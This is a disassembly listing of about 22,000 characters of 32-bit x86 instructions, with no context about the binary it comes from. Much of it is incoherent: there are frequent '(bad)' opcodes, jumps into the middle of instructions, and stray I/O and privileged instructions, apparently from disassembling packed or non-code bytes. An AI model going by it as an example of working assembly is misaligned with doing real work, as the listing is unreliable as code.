  40ec11:	dec    DWORD PTR [ecx-0x740f0375]
  40ec17:	push   ebp
  40ec18:	cld    
  40ec19:	xor    ecx,DWORD PTR [edi-0x76f07efd]
  40ec1f:	retf   0x558b
  40ec22:	clc    
  40ec23:	xor    esi,eax
  40ec25:	add    esi,DWORD PTR [ebp-0x75]
  40ec28:	(bad)  
  40ec29:	hlt    
  40ec2a:	or     cl,BYTE PTR [esi+eax*8-0x39cdf763]
  40ec31:	mov    DWORD PTR [edx],ecx
  40ec33:	hlt    
  40ec34:	(bad)  
  40ec35:	dec    ebp
  40ec36:	add    dh,BYTE PTR [ebx]
  40ec38:	leave  
  40ec39:	mov    edx,0xffec8d55
  40ec3e:	push   ecx
  40ec3f:	rol    DWORD PTR [ebp+0x55],1
  40ec42:	mov    DWORD PTR [ebx+0x7d55d8fc],ecx
  40ec48:	mov    eax,0xf8030b33
  40ec4d:	lar    ecx,di
  40ec50:	push   ebp
  40ec51:	retf   0x863b
  40ec54:	jne    0x40ec53
  40ec56:	mov    edi,edi
  40ec58:	or     BYTE PTR [ebp+0x41],dh
  40ec5b:	mov    esp,edx
  40ec5d:	cld    
  40ec5e:	inc    eax
  40ec5f:	mov    al,0x29
  40ec61:	add    DWORD PTR [ecx+0x0],eax
  40ec64:	loope  0x40ebeb
  40ec66:	inc    ecx
  40ec67:	call   edx
  40ec69:	inc    edx
  40ec6b:	mov    eax,DWORD PTR [eax]
  40ec6d:	cld    
  40ec6e:	mov    eax,DWORD PTR [eax+0x8d0151]
  40ec74:	clc    
  40ec75:	xor    BYTE PTR [ebp+0x45],al
  40ec78:	mov    ecx,DWORD PTR [ebx+0x8fc0fc]
  40ec7e:	loopne 0x40ec7f
  40ec80:	mov    edi,edi
  40ec82:	mov    ecx,eax
  40ec84:	clc    
  40ec85:	jne    0x40ec57
  40ec87:	call   0x81fd90
  40ec8c:	sub    DWORD PTR [ebp+0x45],esi
  40ec8f:	test   esi,eax
  40ec91:	je     0x40ec94
  40ec93:	mov    eax,esi
  40ec95:	cld    
  40ec96:	or     DWORD PTR [eax+0x401c9],eax
  40ec9c:	push   ebp
  40ec9d:	add    ah,ch
  40ec9f:	add    BYTE PTR [ecx+0x6a],dl
  40eca2:	inc    ebp
  40eca3:	push   esi
  40eca4:	mov    DWORD PTR [eax-0x4],edx
  40eca7:	pop    edi
  40eca8:	mov    ebx,DWORD PTR [ebx-0x4]
  40ecab:	ret    0xbc
  40ecae:	push   es
  40ecaf:	mov    ecx,DWORD PTR [ecx-0x77274af]
  40ecb5:	clc    
  40ecb6:	lock inc ebp
  40ecb8:	jne    0x40ed10
  40ecba:	(bad)  
  40ecbb:	jne    0x40ecc1
  40ecbd:	mov    eax,0xf841ba66
  40ecc2:	rol    BYTE PTR [esi],cl
  40ecc4:	(bad)  
  40ecc5:	jne    0x40ecf8
  40ecc7:	cmp    eax,ebx
  40ecc9:	pop    esi
  40ecca:	mov    ecx,DWORD PTR [eax]
  40eccc:	push   ecx
  40eccd:	inc    ecx
  40ecce:	lea    edi,[esi-0x8]
  40ecd1:	inc    edx
  40ecd2:	inc    ebp
  40ecd3:	ror    DWORD PTR [ebx-0x408103be],0x41
  40ecda:	xchg   esp,ebp
  40ecdc:	mov    ebx,eax
  40ecde:	mov    ecx,DWORD PTR [ebx-0x722fae08]
  40ece4:	or     edi,eax
  40ece6:	inc    ebp
  40ece7:	inc    ebp
  40ece8:	(bad)  
  40ece9:	mov    ecx,DWORD PTR [eax]
  40eceb:	cld    
  40ecec:	(bad)  
  40eced:	jmp    0x40ecf0
  40ecef:	mov    eax,esi
  40ecf1:	mov    DWORD PTR ds:0x4f8c98b,eax
  40ecf7:	rcl    BYTE PTR [esi+0xf],1
  40ecfa:	iret   
  40ecfb:	inc    ebp
  40ecfc:	leave  
  40ecfd:	(bad)  
  40ecfe:	dec    DWORD PTR [ecx]
  40ed00:	mov    eax,esi
  40ed02:	mov    eax,DWORD PTR [edi]
  40ed04:	mov    dh,0xd1
  40ed07:	push   es
  40ed08:	nop
  40ed09:	(bad)  
  40ed0a:	inc    DWORD PTR [ebx]
  40ed0c:	push   esi
  40ed0d:	leave  
  40ed0e:	iret   
  40ed0f:	add    al,0x46
  40ed11:	push   ebp
  40ed12:	in     eax,0xec
  40ed14:	push   ebp
  40ed15:	push   ecx
  40ed16:	inc    DWORD PTR [ebp+0x56]
  40ed19:	mov    DWORD PTR [esi-0x4],eax
  40ed1c:	loope  0x40ed73
  40ed1e:	sbb    BYTE PTR [eax+0x7c6daff],bh
  40ed24:	add    al,BYTE PTR [edx]
  40ed26:	mov    edx,DWORD PTR [ebp-0x17]
  40ed29:	cmp    edi,esi
  40ed2b:	jne    0x40ed2c
  40ed2d:	(bad)  
  40ed2e:	push   esi
  40ed2f:	pop    es
  40ed30:	push   ebp
  40ed31:	mov    ebp,esp
  40ed33:	or     BYTE PTR [ebp+0x41],al
  40ed36:	add    edi,edx
  40ed38:	sub    BYTE PTR [eax-0x4],al
  40ed3b:	ret    0xc275
  40ed3e:	add    DWORD PTR [eax],eax
  40ed40:	sbb    al,0x8b
  40ed42:	mov    edx,DWORD PTR [ecx+0x14]
  40ed45:	lea    edx,[edx-0x1ba7508]
  40ed4b:	push   esi
  40ed4c:	enter  0xd375,0xb8
  40ed50:	test   DWORD PTR [esi],0x6ce0750
  40ed56:	enter  0xd375,0x3b
  40ed5a:	neg    DWORD PTR [esi+0x50]
  40ed5d:	or     cl,dl
  40ed5f:	inc    edx
  40ed60:	(bad)  
  40ed61:	in     eax,dx
  40ed62:	in     al,dx
  40ed63:	(bad)  
  40ed64:	sub    eax,DWORD PTR [ebx]
  40ed66:	inc    eax
  40ed67:	in     eax,dx
  40ed68:	push   eax
  40ed69:	add    dl,BYTE PTR [eax-0x37]
  40ed6c:	push   edi
  40ed6d:	push   ebp
  40ed6e:	imul   ah
  40ed70:	adc    DWORD PTR [ecx-0x1],0x45
  40ed74:	add    BYTE PTR [ecx+0x55d3fc00],cl
  40ed7a:	lea    edi,[eax-0x7fff4ca]
  40ed80:	mov    eax,0x4550402
  40ed85:	cmp    ebp,ecx
  40ed87:	jne    0x40ed34
  40ed89:	mov    eax,DWORD PTR ds:0x241e808
  40ed8f:	loope  0x40ed91
  40ed91:	inc    eax
  40ed92:	stc    
  40ed93:	xlat   BYTE PTR ds:[ebx]
  40ed94:	ss inc ecx
  40ed96:	aas    
  40ed97:	in     eax,0x7d
  40ed99:	ret    0x8b
  40ed9c:	lock mov edi,DWORD PTR [ebp-0x18]
  40eda0:	and    edi,edi
  40eda2:	mov    edi,edi
  40eda4:	call   0xe40eee80
  40eda9:	push   es
  40edaa:	add    al,ch
  40edac:	ud0    edx,DWORD PTR [ebp-0x7574ff01]
  40edb3:	(bad)  
  40edb4:	hlt    
  40edb5:	add    eax,0xffd3e87d
  40edba:	cmp    bh,0x8
  40edbd:	(bad)  
  40edbe:	fld    DWORD PTR [esi]
  40edc0:	out    dx,al
  40edc1:	call   0xff9fecc9
  40edc6:	cmp    al,0x46
  40edc8:	shr    esp,0x8
  40edcb:	(bad)  
  40edcc:	pop    es
  40edcd:	fisttp QWORD PTR [ebp+0xe577eff]
  40edd3:	push   ebx
  40edd4:	add    BYTE PTR [ebx+0x24008b56],cl
  40edda:	add    BYTE PTR [ebp+0x50],al
  40eddd:	push   eax
  40edde:	add    DWORD PTR [ebx+0x757d1834],ecx
  40ede4:	sub    edx,DWORD PTR [esi-0x24]
  40ede7:	jne    0x40ed9f
  40ede9:	lods   eax,DWORD PTR ds:[esi]
  40edea:	mov    edx,DWORD PTR [edx-0x34]
  40eded:	dec    esi
  40edee:	out    0x83,eax
  40edf0:	into   
  40edf1:	push   edi
  40edf3:	loopne 0x40edc3
  40edf5:	shr    BYTE PTR [edx+ecx*4+0x0],1
  40edf9:	xor    DWORD PTR [eax-0x741fff01],0xffffffd0
  40ee00:	rol    DWORD PTR [edx],0x8
  40ee03:	mov    esp,ecx
  40ee05:	cmp    DWORD PTR [ebx],0xc
  40ee08:	mov    esi,0x5001c0
  40ee0d:	push   eax
  40ee0e:	push   cs
  40ee0f:	push   eax
  40ee10:	(bad)  
  40ee11:	sub    edx,edi
  40ee13:	push   esi
  40ee14:	adc    al,0xcb
  40ee16:	ins    DWORD PTR es:[edi],dx
  40ee17:	mov    eax,0x203e8
  40ee1c:	add    al,ah
  40ee1e:	inc    esi
  40ee1f:	mov    al,ch
  40ee21:	pop    es
  40ee22:	add    DWORD PTR [eax],0x1
  40ee25:	add    dh,al
  40ee27:	add    ah,ch
  40ee29:	rol    DWORD PTR [edx-0xd],1
  40ee2c:	cli    
  40ee2d:	push   0x4a
  40ee2f:	pop    ecx
  40ee30:	retf   0xfe6
  40ee33:	add    BYTE PTR [ebx-0x4e72f41e],al
  40ee39:	(bad)  
  40ee3a:	dec    BYTE PTR [ebx+0x45b1fc72]
  40ee40:	(bad)  
  40ee41:	sub    ebp,DWORD PTR [ebx]
  40ee43:	and    al,0x52
  40ee45:	(bad)  
  40ee46:	dec    edi
  40ee47:	inc    ebp
  40ee48:	shl    DWORD PTR [eax+0x24fe8c8],0x0
  40ee4f:	add    BYTE PTR [ebp-0x7b],dh
  40ee52:	pop    eax
  40ee53:	add    BYTE PTR [edx+0x0],bl
  40ee56:	pop    edx
  40ee57:	dec    ebp
  40ee58:	jmp    DWORD PTR [ebx]
  40ee5a:	and    al,0xec
  40ee5c:	push   edx
  40ee5d:	out    0x64,eax
  40ee5f:	jmp    0xd3f2e464
  40ee64:	jmp    0x40eebe
  40ee66:	mov    al,0xfe
  40ee68:	dec    BYTE PTR [ebp-0x18fd8018]
  40ee6e:	add    BYTE PTR [esi+ebp*1],bh
  40ee71:	pop    edx
  40ee72:	icebp  
  40ee73:	mov    eax,cs
  40ee75:	ins    BYTE PTR es:[edi],dx
  40ee76:	adc    eax,0x75510000
  40ee7b:	mov    esi,0x70158
  40ee80:	or     DWORD PTR [eax-0x74f48dfe],esi
  40ee86:	mov    edi,esp
  40ee88:	cld    
  40ee89:	jge    0x40ef00
  40ee8b:	(bad)  
  40ee8d:	aas    
  40ee8e:	and    al,0x6d
  40ee90:	adc    cl,0x1
  40ee93:	mov    eax,DWORD PTR [eax]
  40ee95:	and    ecx,DWORD PTR [ebx-0x167203fd]
  40ee9b:	dec    ebp
  40ee9c:	add    eax,ebp
  40ee9e:	add    BYTE PTR [edx],al
  40eea0:	fadd   DWORD PTR [eax]
  40eea2:	stc    
  40eea3:	enter  0xee00,0x8b
  40eea7:	sbb    eax,0x1
  40eeaa:	sbb    esi,ecx
  40eeac:	in     al,0x0
  40eeae:	in     eax,dx
  40eeaf:	add    BYTE PTR [eax],al
  40eeb1:	jne    0x40ee3e
  40eeb3:	cmp    edx,esp
  40eeb5:	jb     0x40eec0
  40eeb7:	jmp    0x40ef2e
  40eeb9:	mov    ecx,DWORD PTR [ebx+0x4d91d4cc]
  40eebf:	add    BYTE PTR [ebx+0x4d83d840],cl
  40eec5:	add    DWORD PTR [ebx+0x4d3bdcee],ecx
  40eecb:	jb     0x40ee56
  40eecd:	pop    edx
  40eece:	fadd   QWORD PTR [ebx-0x7445faa1]
  40eed4:	or     dh,BYTE PTR [edx+0x0]
  40eed7:	inc    edx
  40eed8:	or     dl,bh
  40eeda:	xlat   BYTE PTR ds:[ebx]
  40eedb:	dec    edx
  40eedc:	push   edi
  40eedd:	add    al,0x7
  40eedf:	leave  
  40eee0:	rol    DWORD PTR [edx+eax*1],0x7
  40eee4:	add    ecx,ecx
  40eee6:	mov    edx,ecx
  40eee8:	int3   
  40eee9:	jmp    0x40eea9
  40eeeb:	mov    al,0x0
  40eeed:	(bad)  
  40eeee:	jne    0x40eed8
  40eef0:	mov    eax,DWORD PTR [edx]
  40eef2:	call   0xc1556bf7
  40eef7:	pop    edi
  40eef8:	add    ebx,DWORD PTR [ecx-0x37]
  40eefb:	pop    ecx
  40eefc:	or     BYTE PTR [ecx*4-0x1445b8af],dh
  40ef03:	push   es
  40ef04:	mov    eax,DWORD PTR [eax]
  40ef06:	int3   
  40ef07:	add    ch,al
  40ef09:	jae    0x40eef3
  40ef0b:	int    0x1
  40ef0d:	enter  0x3000,0x18
  40ef11:	add    BYTE PTR [ebp+0x75],al
  40ef14:	mov    esi,DWORD PTR [eax-0x171f0134]
  40ef1a:	push   0x2
  40ef1c:	pop    ecx
  40ef1d:	add    BYTE PTR [eax],cl
  40ef1f:	push   ebx
  40ef20:	lea    edi,[edi+eax*2]
  40ef23:	mov    al,0x1
  40ef25:	jb     0x40ef27
  40ef27:	mov    al,0x10
  40ef29:	push   eax
  40ef2a:	add    al,0x75
  40ef2c:	add    BYTE PTR [ebx],ch
  40ef2e:	add    ebx,esp
  40ef30:	int3   
  40ef31:	jne    0x40ef43
  40ef33:	movsx  edx,cl
  40ef36:	add    DWORD PTR [eax],eax
  40ef38:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  40ef3f:	mov    gs,edi
  40ef41:	add    BYTE PTR [eax-0x50],ch
  40ef44:	add    al,ch
  40ef46:	mov    eax,DWORD PTR [ecx]
  40ef48:	sub    eax,DWORD PTR [eax]
  40ef4a:	jb     0x40efc1
  40ef4c:	add    DWORD PTR [esp+eiz*8-0x50],esi
  40ef50:	jge    0x40ef3a
  40ef52:	add    al,0x1
  40ef54:	add    DWORD PTR [eax],0x0
  40ef57:	jne    0x40ef59
  40ef59:	je     0x40efa0
  40ef5b:	mov    eax,DWORD PTR [edi]
  40ef5d:	ror    BYTE PTR [ebp+0x4d],1
  40ef60:	or     DWORD PTR [ecx+0x4d03d004],0x3
  40ef67:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  40ef6d:	mov    DWORD PTR [ebx],ebp
  40ef6f:	fadd   DWORD PTR [eax+0x75]
  40ef72:	inc    eax
  40ef73:	pop    eax
  40ef74:	lea    ebx,[ecx+0x4f]
  40ef77:	push   0xb1000003
  40ef7c:	out    dx,eax
  40ef7d:	add    ebp,DWORD PTR [edx+edx*2]
  40ef80:	add    BYTE PTR [ebx+ecx*4],bh
  40ef83:	mov    ch,BYTE PTR [ebx]
  40ef85:	jb     0x40eff9
  40ef87:	add    al,0x89
  40ef89:	push   eax
  40ef8a:	call   0x84293cfc
  40ef8f:	add    DWORD PTR [eax+eax*1],eax
  40ef92:	jae    0x40efa8
  40ef94:	icebp  
  40ef95:	inc    ebp
  40ef96:	mov    eax,DWORD PTR gs:[ecx]
  40ef99:	int3   
  40ef9a:	out    dx,al
  40ef9b:	loopne 0x40efea
  40ef9d:	sub    eax,DWORD PTR [edx]
  40ef9f:	push   0xffffff83
  40efa1:	pop    esi
  40efa2:	push   cs
  40efa3:	jl     0x40efbe
  40efa5:	add    al,0xaf
  40efa7:	xor    eax,0x832b6d00
  40efac:	mov    eax,DWORD PTR [edx]
  40efae:	rcr    BYTE PTR [ebp+0x754500dc],cl
  40efb4:	ror    DWORD PTR [ebx+0x7dc8e803],1
  40efba:	inc    ebp
  40efbb:	shr    ebx,0x3
  40efbe:	or     DWORD PTR [eax],0x4
  40efc1:	push   0xffffffa5
  40efc3:	pop    esi
  40efc4:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  40efcb:	jmp    0x40f02a
  40efcd:	mov    edi,0xff0272
  40efd2:	fdivr  QWORD PTR [ebp+0x5d]
  40efd5:	push   0x4e
  40efd7:	pop    ecx
  40efd8:	call   0x4133dd
  40efdd:	mov    DWORD PTR [ebx],eax
  40efdf:	in     al,0xc8
  40efe1:	rol    BYTE PTR [ebp-0x75],0xc1
  40efe5:	call   0xaaf1c6
  40efea:	pop    esi
  40efeb:	enter  0xceff,0x8b
  40efef:	repz mov ecx,DWORD PTR [ebp-0x34]
  40eff3:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  40effa:	je     0x40effc
  40effc:	or     DWORD PTR [ebx-0x74183b24],eax
  40f002:	jne    0x40efe8
  40f004:	jmp    0x40efff
  40f006:	push   DWORD PTR [edx-0x24]
  40f009:	push   0x4d
  40f00b:	pop    ecx
  40f00c:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  40f010:	jge    0x40f018
  40f012:	mov    eax,eax
  40f014:	sub    ebp,DWORD PTR [edx+0x24]
  40f017:	pop    esi
  40f018:	inc    ebp
  40f019:	mov    esp,0x8b6077
  40f01e:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  40f024:	lods   al,BYTE PTR ds:[esi]
  40f025:	add    BYTE PTR [ebx],bh
  40f027:	enter  0xce73,0x49
  40f02b:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  40f033:	stc    
  40f034:	jge    0x40f0a8
  40f036:	jnp    0xdd407397
  40f03c:	call   0xc3f112
  40f041:	fadd   st(0),st
  40f043:	dec    esi
  40f044:	ins    BYTE PTR es:[edi],dx
  40f045:	stc    
  40f046:	cmp    al,0x73
  40f048:	push   ebp
  40f049:	mov    eax,0xf8028b
  40f04e:	jne    0x40f011
  40f050:	mov    esi,ecx
  40f052:	mov    esp,DWORD PTR [ebp+0x2c]
  40f055:	add    edi,DWORD PTR [ebp-0x24]
  40f058:	sub    esp,eax
  40f05a:	and    al,0x45
  40f05c:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  40f062:	sbb    al,0xee
  40f064:	pop    esi
  40f065:	call   0x80f095
  40f06a:	fsubr  st,st(3)
  40f06c:	sti    
  40f06d:	add    BYTE PTR gs:[ecx],bh
  40f070:	add    eax,esp
  40f072:	add    DWORD PTR [esi],eax
  40f074:	rol    DWORD PTR [ebp+0x8],0x29
  40f078:	mov    esp,eax
  40f07a:	clc    
  40f07b:	jne    0x40f0f2
  40f07d:	mov    eax,0x8b0673
  40f082:	loopne 0x40f0c9
  40f084:	loopne 0x40f00f
  40f086:	lods   al,BYTE PTR ds:[esi]
  40f087:	int3   
  40f088:	inc    ebp
  40f089:	mov    DWORD PTR gs:[eax+edi*8],eax
  40f08d:	add    al,0xc3
  40f08f:	sub    ecx,DWORD PTR [ebp+0x47]
  40f092:	(bad)  
  40f094:	shr    BYTE PTR [ebp-0x1f],0xe8
  40f098:	add    eax,DWORD PTR [eax]
  40f09a:	call   0x642b19f
  40f09f:	add    esi,DWORD PTR [esi-0x3b2efc83]
  40f0a5:	dec    esi
  40f0a6:	ins    DWORD PTR es:[edi],dx
  40f0a7:	in     al,dx
  40f0a8:	lea    eax,[eax]
  40f0aa:	inc    ebp
  40f0ab:	inc    ebp
  40f0ac:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  40f0b2:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  40f0bc:	and    al,0xdc
  40f0be:	ror    DWORD PTR [edx+0x24],0xf7
  40f0c2:	or     BYTE PTR [ebp+0x4c],dh
  40f0c5:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  40f0c9:	stos   BYTE PTR es:[edi],al
  40f0ca:	adc    edx,edi
  40f0cc:	inc    esp
  40f0cd:	add    edi,DWORD PTR [eax]
  40f0cf:	jne    0x40f0b4
  40f0d1:	mov    DWORD PTR [eax-0x7449db04],ecx
  40f0d7:	cmp    ecx,DWORD PTR [edi]
  40f0d9:	sub    BYTE PTR [ebp-0x7e],dl
  40f0dc:	sar    ebp,0xb
  40f0df:	jmp    FWORD PTR [edi+0x2400392a]
  40f0e5:	sub    esi,DWORD PTR [ebx-0x73]
  40f0e8:	mov    esp,DWORD PTR [ecx+edi*4]
  40f0eb:	mov    ecx,DWORD PTR [eax]
  40f0ed:	and    BYTE PTR [eax],al
  40f0ef:	jne    0x40f0bb
  40f0f1:	sub    ebp,ecx
  40f0f3:	sbb    BYTE PTR [esi+0x32],ah
  40f0f6:	dec    ebp
  40f0f7:	push   ebp
  40f0f8:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  40f0fe:	ret    
  40f0ff:	mov    edx,ebp
  40f101:	leave  
  40f102:	sub    DWORD PTR [esi+0x24],ebx
  40f105:	ret    0x2b
  40f108:	pop    ax
  40f10a:	push   ebp
  40f10b:	rol    BYTE PTR [ebx],0xeb
  40f10e:	add    DWORD PTR [ecx+0x6c0001],0x40
  40f115:	jb     0x40f16c
  40f117:	ret    
  40f118:	in     al,dx
  40f119:	jecxz  0x40f0a6
  40f11b:	push   esi
  40f11c:	xchg   esp,eax
  40f11d:	jne    0x40f11f
  40f11f:	cmp    edx,DWORD PTR [esi+0x1c]
  40f122:	jne    0x40f108
  40f124:	mov    eax,DWORD PTR [ebp-0x77]
  40f127:	ror    DWORD PTR [ebx+0x899408],0xe0
  40f12e:	mov    esi,DWORD PTR [ebp-0x75]
  40f131:	pop    esi
  40f132:	nop
  40f133:	mov    eax,DWORD PTR [eax]
  40f135:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  40f13b:	add    al,0x0
  40f13d:	inc    ebp
  40f13e:	mov    eax,DWORD PTR [ebx]
  40f140:	mov    ebp,ebx
  40f142:	cmp    al,0xf
  40f144:	or     al,al
  40f146:	inc    ebp
  40f147:	inc    ebp
  40f148:	xor    eax,0x8bc89c8b
  40f14d:	ins    BYTE PTR es:[edi],dx
  40f14e:	cld    
  40f14f:	add    BYTE PTR [edi+0x566c16c0],dh
  40f155:	add    BYTE PTR [ecx-0x5],dl
  40f158:	add    eax,0x17200
  40f15d:	sbb    al,0x85
  40f15f:	dec    esp
  40f160:	je     0x40f19a
  40f162:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  40f166:	add    BYTE PTR [ebx],bh
  40f168:	(bad)  
  40f169:	and    al,0x32
  40f16b:	jae    0x40f109
  40f16d:	mov    cl,cl
  40f16f:	inc    DWORD PTR [esp]
  40f172:	push   ebp
  40f173:	shr    esp,0x8
  40f176:	in     al,dx
  40f177:	push   esp
  40f178:	add    DWORD PTR [eax],esp
  40f17a:	add    bl,cl
  40f17c:	inc    ebp
  40f17d:	mov    bh,0x53
  40f17f:	add    BYTE PTR [ebp-0x17],al
  40f182:	push   esi
  40f183:	cmovne ecx,edx
  40f186:	xor    cl,BYTE PTR [esp+ebx*4+0x20]
  40f18a:	push   edi
  40f18b:	pop    ss
  40f18c:	xor    eax,0x89009cd9
  40f191:	add    ah,bh
  40f193:	sub    eax,DWORD PTR [ebp-0x3f]
  40f196:	aad    0x5
  40f198:	inc    ebp
  40f199:	add    edx,edx
  40f19b:	add    BYTE PTR [ebp-0x40],al
  40f19e:	xlat   BYTE PTR ds:[ebx]
  40f19f:	ins    BYTE PTR es:[edi],dx
  40f1a0:	inc    ebp
  40f1a1:	inc    eax
  40f1a2:	and    ecx,eax
  40f1a4:	dec    eax
  40f1a5:	add    eax,0x20204c45
  40f1aa:	inc    ebp
  40f1ab:	fnstcw WORD PTR [esi+0x29]
  40f1ae:	leave  
  40f1af:	add    BYTE PTR [esi+0xc000c0],bh
  40f1b5:	lea    eax,[esp-0x34]
  40f1b9:	ret    
  40f1ba:	mov    dh,0x8b
  40f1bc:	xor    edx,DWORD PTR [ecx+0x3]
  40f1bf:	mov    al,BYTE PTR [ecx+0x1]
  40f1c2:	sbb    BYTE PTR [eax],al
  40f1c4:	stc    
  40f1c5:	mov    esi,DWORD PTR [edx+0x8]
  40f1c8:	(bad)  
  40f1c9:	les    esi,FWORD PTR ss:[ecx]
  40f1cc:	(bad)  
  40f1cd:	mov    al,ch
  40f1cf:	add    esi,eax
  40f1d1:	add    dh,al
  40f1d3:	or     esi,eax
  40f1d5:	mov    dl,0xc7
  40f1d7:	add    esi,eax
  40f1d9:	add    al,cl
  40f1db:	push   cs
  40f1dc:	mov    BYTE PTR [edx+0xc601c9],0xca
  40f1e3:	or     BYTE PTR [ebx],dh
  40f1e5:	dec    ecx
  40f1e6:	lea    eax,[ebx]
  40f1e8:	or     eax,0x18fc0fc7
  40f1ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f1ee:	(bad)  
  40f1f0:	fiadd  WORD PTR [ebp-0x78]
  40f1f3:	jae    0xed75f942
  40f1f9:	or     BYTE PTR [ebp+0x7],al
  40f1fc:	loope  0x40f19b
  40f1fe:	inc    ebp
  40f1ff:	xor    dl,dh
  40f201:	pop    esi
  40f202:	inc    ebp
  40f203:	shr    edx,0xc
  40f206:	inc    ebp
  40f207:	and    ch,0x1
  40f20a:	inc    ebp
  40f20b:	add    bh,bl
  40f20d:	add    BYTE PTR [ebp-0x7b],al
  40f210:	out    dx,al
  40f211:	clc    
  40f212:	inc    ebp
  40f213:	ret    0xd7
  40f216:	inc    ebp
  40f217:	mov    edi,DWORD PTR [esi-0x7f]
  40f21a:	leave  
  40f21b:	sub    al,0x44
  40f21d:	add    BYTE PTR [ebx+ecx*4-0x76cce34a],bh
  40f224:	add    ebx,DWORD PTR [ecx+eax*2]
  40f227:	(bad)  
  40f228:	sbb    al,ah
  40f22a:	stc    
  40f22b:	test   DWORD PTR [edx-0x8],esi
  40f22e:	lea    edi,[edi-0x7007aa4]
  40f234:	mov    DWORD PTR [ebp-0x24],edi
  40f237:	(bad)  
  40f238:	dec    ebp
  40f239:	int3   
  40f23a:	mov    eax,0x71cdfcc6
  40f23f:	mov    BYTE PTR [ecx],0xce
  40f242:	(bad)  
  40f243:	(bad)  
  40f244:	dec    edi
  40f246:	jmp    FWORD PTR [edx-0x38]
  40f249:	(bad)  
  40f24a:	or     dl,al
  40f24c:	jge    0x40f214
  40f24e:	(bad)  
  40f24f:	shl    esp,1
  40f251:	xor    eax,DWORD PTR [ebp+0x45caf85a]
  40f257:	add    BYTE PTR [ebx+0xd8c8d],cl
  40f25d:	rdpmc  
  40f25f:	sbb    BYTE PTR [edi+0x7de08da],bh
  40f265:	mov    BYTE PTR [ebp+0x39063283],bl
  40f26b:	in     eax,dx
  40f26c:	cmovne ebx,DWORD PTR [edx]
  40f26f:	jecxz  0x40f271
  40f271:	inc    ebp
  40f272:	mov    esp,ecx
  40f274:	sbb    al,0x45
  40f276:	mov    ebx,edx
  40f278:	add    DWORD PTR [ebp+0x0],eax
  40f27b:	loopne 0x40f27e
  40f27d:	inc    ebp
  40f27e:	dec    ebp
  40f27f:	and    DWORD PTR [ebx+0x208045],ecx
  40f285:	inc    ebp
  40f286:	mov    DWORD PTR [esi+0x6a],edi
  40f289:	leave  
  40f28a:	mov    DWORD PTR [esp+edx*8-0x3c],0x33e5b6d6
  40f292:	inc    ebp
  40f293:	add    ebx,edi
  40f295:	inc    ecx
  40f296:	xlat   BYTE PTR ds:[ebx]
  40f297:	sbb    BYTE PTR [ebp-0x758d2b07],cl
  40f29d:	(bad)  
  40f29e:	xor    bh,BYTE PTR [eax+eax*4+0x8bd36c6]
  40f2a5:	(bad)  
  40f2a6:	dec    esi
  40f2a7:	mov    esi,0xbf45c6f3
  40f2ac:	mov    esi,eax
  40f2ae:	fadd   st,st(0)
  40f2b0:	inc    esi
  40f2b2:	(bad)  
  40f2b3:	rcl    esp,0xc6
  40f2b6:	inc    edx
  40f2b8:	push   eax
  40f2b9:	mov    BYTE PTR [ebp-0x3d],0x33
  40f2bd:	xor    eax,DWORD PTR [ebx]
  40f2bf:	lea    edx,[eax+0xd]
  40f2c2:	inc    ebp
  40f2c3:	jae    0x8c1b58e1
  40f2c9:	ficomp WORD PTR [eax+ecx*4]
  40f2cc:	add    BYTE PTR [ebx-0x12fff7ff],0x85
  40f2d3:	test   esi,edi
  40f2d5:	(bad)  
  40f2d6:	(bad)  
  40f2d7:	inc    DWORD PTR [eax]
  40f2d9:	inc    ebp
  40f2da:	add    BYTE PTR [ebx-0x10aa23d0],cl
  40f2e0:	mov    edx,DWORD PTR [ebx]
  40f2e2:	cld    
  40f2e3:	mov    edi,ecx
  40f2e5:	mov    ecx,ebx
  40f2e7:	pop    esp
  40f2e8:	sar    edi,0x1e
  40f2eb:	cmp    ebp,esp
  40f2ed:	jne    0x40f362
  40f2ef:	mov    DWORD PTR ds:0x22450be4,ecx
  40f2f5:	loopne 0x40f2e3
  40f2f7:	pushf  
  40f2f8:	jae    0x40f285
  40f2fa:	add    eax,0x3388e91c
  40f2ff:	add    esp,ebp
  40f301:	add    BYTE PTR [ebx-0x40],dh
  40f304:	jmp    0x91f35f
  40f309:	mov    ebx,0x6a7275
  40f30e:	pop    ecx
  40f30f:	add    DWORD PTR [ebp+eax*4-0x77],esi
  40f313:	add    bh,BYTE PTR [eax+0x0]
  40f316:	dec    DWORD PTR [ebp+0x66]
  40f319:	mov    ecx,DWORD PTR [ebp-0xff0084]
  40f31f:	mov    DWORD PTR [edx-0x75],ebp
  40f322:	data16 sbb al,0x8d
  40f325:	mov    edi,edi
  40f327:	add    edi,edi
  40f329:	add    BYTE PTR [edx+0x1],ch
  40f32c:	data16 or BYTE PTR [ebp-0x1e00bb],cl
  40f333:	jmp    0xee6a:0xd84dc766
  40f33a:	pop    ecx
  40f33b:	jle    0x40f2c6
  40f33d:	inc    ebp
  40f33e:	sbb    BYTE PTR [esi-0x37],0x8
  40f342:	test   edx,ecx
  40f344:	(bad)  
  40f345:	jmp    0x41017c49
  40f34a:	push   ebp
  40f34b:	jne    0x40f3b3
  40f34d:	lea    ecx,[ebp-0x2c]
  40f350:	mov    DWORD PTR [ebp-0x200158],0xfe4585d6
  40f35a:	sar    bh,0xeb
  40f35d:	mov    eax,edi
  40f35f:	loopne 0x40f311
  40f361:	(bad)  
  40f362:	rol    ebx,cl
  40f364:	jmp    0xe9c0:0xdf1c458b
  40f36b:	push   eax
  40f36c:	inc    bp
  40f36e:	inc    ebp
  40f36f:	mov    eax,ebp
  40f371:	cwde   
  40f372:	mov    DWORD PTR [eax],0xd4ffc7d4
  40f378:	add    bh,bh
  40f37a:	add    BYTE PTR [ecx],al
  40f37c:	call   0x1400b81
  40f381:	inc    DWORD PTR [ebp-0xb201f8]
